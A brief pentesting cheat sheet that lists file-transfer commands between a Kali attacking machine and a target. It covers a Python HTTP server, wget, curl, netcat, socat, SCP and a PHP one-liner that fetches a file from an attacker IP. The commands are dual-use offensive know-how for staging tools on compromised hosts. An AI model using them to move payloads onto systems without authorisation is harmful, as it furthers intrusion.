Kali Machine(Attacking machine)- We need to start the http server to serve the files so that other systems can access it.

HTTP Server
```python
python -m SimpleHTTPServer 80
python -m http.server 80
```

Wget
```
wget http://192.168.1.2/filename.txt
```

Curl
```
curl http://192.168.1.2/filename.txt -o filename.txt
```

Netcat

Target Linux
```
nc -nlvp 4444 > outputfile.exe
```
Kali
```
nc -nv 192.168.1.2 4444 < /usr/inputfile.exe
```

Socat
Kali
```
socat TCP4-LISTEN:443,fork file:file.txt
```
Target Linux
```
socat TCP4:192.168.1.2:443 file:file.txt,create
```

SCP
```
scp /source/path/file.zip username@192.168.1.2:/destination/path/file.zip
```

PHP
```php
echo "<?php file_put_contents('filename', fopen('http://192.168.1.2/filename', 'r')); ?>" > filename.php
```
